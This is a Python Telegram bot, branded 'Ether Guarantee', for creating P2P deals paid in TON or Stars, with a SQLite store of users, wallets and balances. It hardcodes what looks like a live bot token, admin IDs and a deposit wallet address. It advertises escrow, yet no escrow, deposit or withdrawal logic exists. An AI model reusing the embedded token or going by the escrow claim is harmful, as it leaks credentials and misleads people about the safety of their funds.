import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
import uuid
import logging
import os

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8464403655:AAGTZPYm8F9hjiLWJVpJJnXgrS2e4ytkMdU")
SUPER_ADMIN_IDS = {8405627314, 8424970062}
DEPOSIT_TON_ADDRESS = "UQAcCNRAk9Swq5-P9px5gOW58RRHim4-Ok6vWgYjQI03qTAt"
ADMIN_CHAT_ID = -5097403821

# Глобальные переменные
user_data = {}
deals = {}
ADMIN_ID = set()
DB_NAME = 'bot_data.db'

def init_db():
    """Инициализация базы данных"""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        # Таблица пользователей
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                ton_wallet TEXT,
                balance_ton REAL DEFAULT 0.0,
                balance_rub REAL DEFAULT 0.0,
                balance_stars REAL DEFAULT 0.0,
                successful_deals INTEGER DEFAULT 0,
                lang TEXT DEFAULT 'ru',
                is_admin INTEGER DEFAULT 0
            )
        ''')

        # Таблица сделок
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS deals (
                deal_id TEXT PRIMARY KEY,
                amount REAL,
                description TEXT,
                seller_id INTEGER,
                buyer_id INTEGER,
                status TEXT,
                payment_method TEXT
            )
        ''')

        conn.commit()
        conn.close()
        logger.info("Database initialized successfully")
    except Exception as e:
        logger.error(f"Error initializing database: {e}")

def load_data():
    """Загрузка данных из базы"""
    global ADMIN_ID
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        # Загрузка пользователей
        cursor.execute('SELECT user_id, ton_wallet, balance_ton, balance_rub, balance_stars, successful_deals, lang, is_admin FROM users')
        for row in cursor.fetchall():
            user_id, ton_wallet, balance_ton, balance_rub, balance_stars, successful_deals, lang, is_admin = row
            user_data[user_id] = {
                'ton_wallet': ton_wallet or '',
                'balance_ton': balance_ton or 0.0,
                'balance_rub': balance_rub or 0.0,
                'balance_stars': balance_stars or 0.0,
                'successful_deals': successful_deals or 0,
                'lang': lang or 'ru',
                'is_admin': is_admin or 0
            }
            if is_admin:
                ADMIN_ID.add(user_id)

        # Добавляем суперадминов
        for super_admin_id in SUPER_ADMIN_IDS:
            if super_admin_id not in user_data:
                user_data[super_admin_id] = {
                    'ton_wallet': '',
                    'balance_ton': 0.0,
                    'balance_rub': 0.0,
                    'balance_stars': 0.0,
                    'successful_deals': 0,
                    'lang': 'ru',
                    'is_admin': 1
                }
                ADMIN_ID.add(super_admin_id)
                save_user_data(super_admin_id)

        # Загрузка сделок
        cursor.execute('SELECT deal_id, amount, description, seller_id, buyer_id, status, payment_method FROM deals')
        for row in cursor.fetchall():
            deal_id, amount, description, seller_id, buyer_id, status, payment_method = row
            deals[deal_id] = {
                'amount': amount or 0.0,
                'description': description or '',
                'seller_id': seller_id,
                'buyer_id': buyer_id,
                'status': status or 'active',
                'payment_method': payment_method or 'ton'
            }

        conn.close()
        logger.info("Data loaded successfully")
    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_user_data(user_id):
    """Сохранение данных пользователя"""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        user = user_data.get(user_id, {})
        cursor.execute('''
            INSERT OR REPLACE INTO users (
                user_id, ton_wallet, balance_ton, balance_rub, balance_stars,
                successful_deals, lang, is_admin
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            user_id,
            user.get('ton_wallet', ''),
            user.get('balance_ton', 0.0),
            user.get('balance_rub', 0.0),
            user.get('balance_stars', 0.0),
            user.get('successful_deals', 0),
            user.get('lang', 'ru'),
            user.get('is_admin', 0)
        ))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving user data: {e}")

def save_deal(deal_id):
    """Сохранение сделки"""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        deal = deals.get(deal_id, {})
        cursor.execute('''
            INSERT OR REPLACE INTO deals (
                deal_id, amount, description, seller_id, buyer_id, status, payment_method
            ) VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            deal_id,
            deal.get('amount', 0.0),
            deal.get('description', ''),
            deal.get('seller_id'),
            deal.get('buyer_id'),
            deal.get('status', 'active'),
            deal.get('payment_method', 'ton')
        ))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving deal: {e}")

def ensure_user_exists(user_id):
    """Создание пользователя если не существует"""
    if user_id not in user_data:
        user_data[user_id] = {
            'ton_wallet': '',
            'balance_ton': 0.0,
            'balance_rub': 0.0,
            'balance_stars': 0.0,
            'successful_deals': 0,
            'lang': 'ru',
            'is_admin': 1 if user_id in SUPER_ADMIN_IDS else 0
        }
        if user_id in SUPER_ADMIN_IDS:
            ADMIN_ID.add(user_id)
        save_user_data(user_id)

# Упрощенные тексты
def get_text(lang, key, **kwargs):
    texts = {
        'ru': {
            "start_message": "🤝 Добро пожаловать в Ether Guarantee!\n\nБезопасные P2P-сделки с гарантией.",
            "create_deal_button": "📝 Создать сделку",
            "add_wallet_button": "💰 Добавить кошелёк",
            "balance_button": "📈 Баланс",
            "referral_button": "🤝 Рефералка",
            "change_lang_button": "🌍 Язык",
            "support_button": "💬 Поддержка",
            "menu_button": "🏠 В главное меню",
            "wallet_menu_message": "Выберите тип кошелька:",
            "add_ton_wallet_button": "➕ TON кошелёк"
        },
        'en': {
            "start_message": "🤝 Welcome to Ether Guarantee!\n\nSecure P2P deals with escrow.",
            "create_deal_button": "📝 Create Deal",
            "add_wallet_button": "💰 Add Wallet",
            "balance_button": "📈 Balance",
            "referral_button": "🤝 Referral",
            "change_lang_button": "🌍 Language",
            "support_button": "💬 Support",
            "menu_button": "🏠 Main Menu",
            "wallet_menu_message": "Choose wallet type:",
            "add_ton_wallet_button": "➕ TON Wallet"
        }
    }
    return texts.get(lang, texts['ru']).get(key, key)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    user_id = update.effective_user.id
    ensure_user_exists(user_id)
    lang = user_data[user_id]['lang']
    
    keyboard = [
        [InlineKeyboardButton(get_text(lang, "create_deal_button"), callback_data='create_deal')],
        [InlineKeyboardButton(get_text(lang, "add_wallet_button"), callback_data='wallet_menu')],
        [InlineKeyboardButton(get_text(lang, "balance_button"), callback_data='view_balance')],
        [InlineKeyboardButton(get_text(lang, "referral_button"), callback_data='referral')],
        [InlineKeyboardButton(get_text(lang, "support_button"), callback_data='support')],
    ]
    
    if user_id in ADMIN_ID:
        keyboard.append([InlineKeyboardButton("🔧 Админка", callback_data='admin_panel')])

    await update.message.reply_text(
        get_text(lang, "start_message"),
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик callback запросов"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    lang = user_data.get(user_id, {}).get('lang', 'ru')
    
    ensure_user_exists(user_id)
    
    if data == 'menu':
        # Главное меню
        keyboard = [
            [InlineKeyboardButton(get_text(lang, "create_deal_button"), callback_data='create_deal')],
            [InlineKeyboardButton(get_text(lang, "add_wallet_button"), callback_data='wallet_menu')],
            [InlineKeyboardButton(get_text(lang, "balance_button"), callback_data='view_balance')],
            [InlineKeyboardButton(get_text(lang, "referral_button"), callback_data='referral')],
            [InlineKeyboardButton(get_text(lang, "support_button"), callback_data='support')],
        ]
        if user_id in ADMIN_ID:
            keyboard.append([InlineKeyboardButton("🔧 Админка", callback_data='admin_panel')])
            
        await query.edit_message_text(
            get_text(lang, "start_message"),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif data == 'wallet_menu':
        # Меню кошельков
        keyboard = [
            [InlineKeyboardButton(get_text(lang, "add_ton_wallet_button"), callback_data='add_ton_wallet')],
            [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
        ]
        await query.edit_message_text(
            get_text(lang, "wallet_menu_message"),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif data == 'add_ton_wallet':
        # Добавление TON кошелька
        current_wallet = user_data.get(user_id, {}).get('ton_wallet', 'Не указан')
        await query.edit_message_text(
            f"💳 Ваш текущий TON-кошелек: <code>{current_wallet}</code>\n\nВведите новый адрес TON-кошелька:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
        )
        context.user_data['awaiting_ton_wallet'] = True
    
    elif data == 'view_balance':
        # Просмотр баланса
        ton_balance = user_data.get(user_id, {}).get('balance_ton', 0.0)
        stars_balance = user_data.get(user_id, {}).get('balance_stars', 0.0)
        
        balance_text = f"💰 Ваш баланс:\n\n💎 TON: {ton_balance}\n🌟 Stars: {stars_balance}"
        
        keyboard = [
            [InlineKeyboardButton("📥 Пополнить", callback_data='deposit_balance')],
            [InlineKeyboardButton("📤 Вывести", callback_data='withdraw_balance')],
            [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
        ]
        
        await query.edit_message_text(
            balance_text,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif data == 'create_deal':
        # Создание сделки
        if not user_data[user_id].get('ton_wallet'):
            await query.edit_message_text(
                "🚫 Сначала добавьте TON-кошелёк для получения платежей",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💰 Добавить кошелёк", callback_data='wallet_menu')],
                    [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
                ])
            )
            return
            
        keyboard = [
            [InlineKeyboardButton("💎 TON", callback_data='payment_method_ton')],
            [InlineKeyboardButton("🌟 Stars", callback_data='payment_method_stars')],
            [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
        ]
        await query.edit_message_text(
            "💰 Выберите способ оплаты:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif data.startswith('payment_method_'):
        # Выбор метода оплаты
        payment_method = data.split('_')[-1]
        context.user_data['payment_method'] = payment_method
        currency = "TON" if payment_method == "ton" else "Stars"
        
        await query.edit_message_text(
            f"Введите сумму сделки в {currency}:\n\nПример: <code>1.5</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
        )
        context.user_data['awaiting_amount'] = True

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик текстовых сообщений"""
    user_id = update.effective_user.id
    text = update.message.text
    
    ensure_user_exists(user_id)
    lang = user_data[user_id]['lang']
    
    if context.user_data.get('awaiting_ton_wallet'):
        # Сохранение TON кошелька
        user_data[user_id]['ton_wallet'] = text.strip()
        save_user_data(user_id)
        context.user_data.clear()
        
        await update.message.reply_text(
            f"✅ TON-кошелёк сохранен: <code>{text.strip()}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
        )
    
    elif context.user_data.get('awaiting_amount'):
        # Обработка суммы сделки
        try:
            amount = float(text.strip())
            if amount <= 0:
                raise ValueError("Amount must be positive")
                
            context.user_data['deal_amount'] = amount
            context.user_data['awaiting_amount'] = False
            context.user_data['awaiting_description'] = True
            
            await update.message.reply_text(
                "📝 Введите описание сделки:\n\nПример: <code>Цифровой товар</code>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
        except ValueError:
            await update.message.reply_text(
                "🚫 Введите корректную сумму (число больше 0)",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
    
    elif context.user_data.get('awaiting_description'):
        # Создание сделки
        description = text.strip()
        amount = context.user_data.get('deal_amount')
        payment_method = context.user_data.get('payment_method', 'ton')
        
        # Генерация ID сделки
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            'amount': amount,
            'description': description,
            'seller_id': user_id,
            'buyer_id': None,
            'status': 'active',
            'payment_method': payment_method
        }
        save_deal(deal_id)
        context.user_data.clear()

        # Создание ссылки на сделку
        bot_username = (await context.bot.get_me()).username
        deal_link = f"https://t.me/{bot_username}?start={deal_id}"
        
        await update.message.reply_text(
            f"✅ Сделка создана!\n\n"
            f"💰 Сумма: {amount} {payment_method.upper()}\n"
            f"📝 Описание: {description}\n"
            f"🔗 Ссылка: {deal_link}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
        )
    
    else:
        # Сообщение по умолчанию
        await update.message.reply_text(
            "Выберите действие из меню:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Exception: {context.error}")

def main():
    """Основная функция"""
    logger.info("Initializing bot...")
    
    # Инициализация БД и данных
    init_db()
    load_data()
    
    # Создание приложения
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрация обработчиков
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(handle_callback_query))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_error_handler(error_handler)
    
    # Запуск бота
    logger.info("Bot starting...")
    application.run_polling()

if __name__ == '__main__':
    main()